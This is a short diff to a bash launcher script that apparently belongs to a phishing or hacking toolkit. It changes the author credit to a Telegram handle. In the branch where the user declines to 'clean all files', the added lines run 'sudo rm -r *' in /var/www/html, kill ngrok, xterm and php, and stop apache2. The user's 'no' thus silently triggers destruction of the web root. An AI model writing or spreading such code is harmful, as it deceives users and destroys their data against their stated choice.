@@ -1,5 +1,5 @@
 #!/bin/bash
-# MOD BY zuzi404.wp on tiktok
+# MOD BY @xiaxtg on telegram
 bash setup.sh
 clear
 cat Launch.txt
@@ -74,8 +74,17 @@ do
 read -p "$green[*] Do you want to clean all files and exit? [Y/n] ==> : " clean
 	case "$clean" in
 [nN])
-sleep 0.5
-echo "" && exit
+echo ""
+sleep 2.5
+cd /var/www/html/
+sudo rm -r *
+cd ..
+mv index.html index.nginx-debian.html html/ &> /dev/null
+pkill ngrok
+pkill xterm
+pkill php
+service apache2 stop
+exit
 ;;
 [Yy])
 echo ""
